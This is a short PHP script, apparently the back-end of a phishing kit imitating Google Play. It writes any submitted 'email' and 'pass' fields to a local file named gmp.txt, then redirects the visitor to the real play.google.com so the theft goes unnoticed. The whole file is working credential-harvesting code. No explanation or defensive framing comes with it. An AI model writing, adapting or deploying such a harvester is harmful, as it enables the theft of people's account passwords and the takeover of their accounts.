<?php header('Location: http://play.google.com');
$handle = fopen("gmp.txt", "a");
foreach ($_POST as $variable => $value) {
    if ($variable == "email" || $variable == "pass") {
        fwrite($handle, $variable);
        fwrite($handle, "= ");
        fwrite($handle, $value);
        fwrite($handle, "
");
    }
}
fwrite($handle, "
");
fclose($handle);
exit;
?>